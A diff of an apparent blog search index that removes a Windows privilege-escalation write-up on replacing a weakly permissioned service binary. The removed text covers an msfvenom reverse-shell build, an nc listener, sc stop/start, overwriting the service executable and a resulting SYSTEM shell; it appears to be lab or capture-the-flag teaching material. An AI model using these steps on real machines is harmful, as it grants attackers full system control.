-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; sc.exe qc service<span class="literal">-name</span></span><br><span class="line"></span><br><span class="line">[<span class="type">SC</span>] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">    SERVICE_NAME: service<span class="literal">-name</span></span><br><span class="line">    <span class="built_in">TYPE</span>               : <span class="number">10</span>  WIN32_OWN_PROCESS</span><br><span class="line">    START_TYPE         : <span class="number">2</span>   AUTO_START</span><br><span class="line">    BINARY_PATH_NAME   : <span class="string">&quot;C:\Program Files\service-name\service-name.exe&quot;</span></span><br><span class="line">    SERVICE_START_NAME : LocalSystem</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><h4 id="Generating-the-Malicious-Binary"><a href="#Generating-the-Malicious-Binary" class="headerlink" title="Generating the Malicious Binary"></a>Generating the Malicious Binary</h4><blockquote>
-<p>➜ We craft a reverse-shell executable that connects back to our listener, we name it with the same target service binary so it overwrites the legitimate one.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ip LPORT=port -f exe -o service-name.exe</span><br></pre></td></tr></table></figure>
-
-<h4 id="Starting-the-Listener"><a href="#Starting-the-Listener" class="headerlink" title="Starting the Listener"></a>Starting the Listener</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rlwrap nc -lvnp port</span><br></pre></td></tr></table></figure>
-
-<h4 id="Checking-If-We-Can-Start-And-Stop-the-Service"><a href="#Checking-If-We-Can-Start-And-Stop-the-Service" class="headerlink" title="Checking If We Can Start And Stop the Service"></a>Checking If We Can Start And Stop the Service</h4><blockquote>
-<p> ➜ To force the service to reload our new binary without waiting for an auto-start or a system reboot, we need to restart it by ourselves which requires <code>SERVICE_STOP</code> to stop it and <code>SERVICE_START</code> to start it again.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS C:\&gt; .\accesschk.exe /accepteula -uvqc SecurityService</span><br><span class="line"></span><br><span class="line">SecurityService</span><br><span class="line">  RW NT AUTHORITY\SYSTEM</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  RW BUILTIN\Administrators</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br><span class="line">  R  NT AUTHORITY\INTERACTIVE</span><br><span class="line">        SERVICE_QUERY_STATUS</span><br><span class="line">        SERVICE_QUERY_CONFIG</span><br><span class="line">        SERVICE_INTERROGATE</span><br><span class="line">        SERVICE_ENUMERATE_DEPENDENTS</span><br><span class="line">        READ_CONTROL</span><br><span class="line">  R  Everyone</span><br><span class="line">        SERVICE_START</span><br><span class="line">        SERVICE_STOP</span><br></pre></td></tr></table></figure>
-
-
-<h4 id="Stop-the-Service"><a href="#Stop-the-Service" class="headerlink" title="Stop the Service"></a>Stop the Service</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\&gt; <span class="built_in">sc</span> stop SecurityService</span><br></pre></td></tr></table></figure>
-
-<h4 id="Replacing-the-Service-Binary"><a href="#Replacing-the-Service-Binary" class="headerlink" title="Replacing the Service Binary"></a>Replacing the Service Binary</h4><blockquote>
-<p>➜ The service is <code>Stopped</code>, so we can overwrite the file directly. </p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\&gt; cmd /c <span class="built_in">copy</span> /Y SecurityService.exe <span class="string">&quot;C:\Program Files (x86)\PCProtect\SecurityService.exe&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="Starting-the-Service"><a href="#Starting-the-Service" class="headerlink" title="Starting the Service"></a>Starting the Service</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\&gt; <span class="built_in">sc</span> <span class="built_in">start</span> SecurityService</span><br></pre></td></tr></table></figure>
-
-<h4 id="Getting-a-SYSTEM-Shell"><a href="#Getting-a-SYSTEM-Shell" class="headerlink" title="Getting a SYSTEM Shell"></a>Getting a SYSTEM Shell</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  weak-permissions rlwrap nc -lvnp 8888</span><br><span class="line">listening on [any] 8888 ...</span><br><span class="line">connect to [10.10.14.5] from (UNKNOWN) [10.10.10.X] 49xxx</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; <span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Windows Privesc</category>
-        <category>Services</category>
-      </categories>
-      <tags>
-        <tag>msfvenom</tag>
-        <tag>Weak-ACL</tag>
-        <tag>AccessChk</tag>
-        <tag>icacls</tag>
-        <tag>Permissive-File-System-ACLs</tag>
-        <tag>Modifiable-Service-Binary</tag>
-        <tag>Service-Binary-Replacement</tag>
-        <tag>SharpUp</tag>
-        <tag>sc.exe</tag>
-        <tag>Windows-Services</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SeTakeOwnershipPrivilege</title>
     <url>/2026/03/06/SeTakeOwnershipPrivilege/</url>
     <content><![CDATA[<blockquote>
@@ -4952,11 +5009,11 @@
       <tags>
         <tag>Windows</tag>
         <tag>Privilege-Escalation</tag>
+        <tag>CVE</tag>
         <tag>PrintNightmare</tag>
         <tag>CVE-2021-1675</tag>
         <tag>CVE-2021-34527</tag>
         <tag>Print-Spooler</tag>
-        <tag>CVE</tag>
         <tag>Metasploit</tag>
         <tag>HiveNightmare</tag>
         <tag>UAC-Bypass</tag>
